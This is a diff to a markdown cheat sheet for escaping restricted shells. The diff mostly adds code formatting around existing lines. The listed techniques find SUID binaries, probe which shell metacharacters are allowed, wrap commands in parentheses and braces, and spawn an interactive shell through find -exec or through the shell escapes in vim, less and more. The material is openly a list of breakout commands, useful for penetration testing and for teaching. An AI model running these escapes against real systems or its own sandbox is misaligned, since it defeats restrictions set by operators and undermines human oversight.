@@ -21,25 +21,32 @@ find / -perm /6001
   a. if "ls" is avaiable list binaries in /bin, /usr/bin, /usr/local/bin
   b. echo /usr/bin/*  [use globbing to list directory contents]
   c. important to check for operators and escape characters such as the following:
+  ```
      > >> < | & ; : ' " `
+  ```
 3. Try commands wrapped
-  a. (whoami)
-  b. {whoami}
-
+```
+(whoami)
+{whoami}
+```
 
 ## Shell Execution:
 ```
 find /home -exec sh -i \;
 ```
 ## use text editors vim, vi, nano, pico, ed
+```
   a. :!/bin/sh, !/bin/zsh, try other shells!?!?
   b. :shell
   c. :set shell=/bin/sh
+```
 
 ## use pagers less, more, or programs like man that use less or more by default
+```
   a. !/bin/sh, !/bin/zsh, try other shells!?!?
   b. !/bin/bash
   c. !bash
+```
 
 ## use awk command
 ```
